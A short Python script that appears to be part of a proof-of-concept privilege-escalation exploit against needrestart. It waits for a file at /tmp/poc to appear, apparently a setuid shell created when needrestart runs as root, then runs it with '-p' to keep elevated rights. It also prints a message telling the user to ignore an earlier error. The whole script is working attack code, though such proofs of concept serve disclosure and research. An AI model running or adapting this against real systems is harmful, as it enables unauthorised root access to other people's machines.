import os
import time

if os.path.exists("/tmp/poc"):
    os.remove('/tmp/poc')

print(f'{42*"#"}\n\nDon\'t mind the error message above\n\nWaiting for needrestart to run...')

while True:
    if os.path.exists("/tmp/poc"):
        print('Got the shell!')
        os.system('/tmp/poc -p')
        break
    time.sleep(0.2)
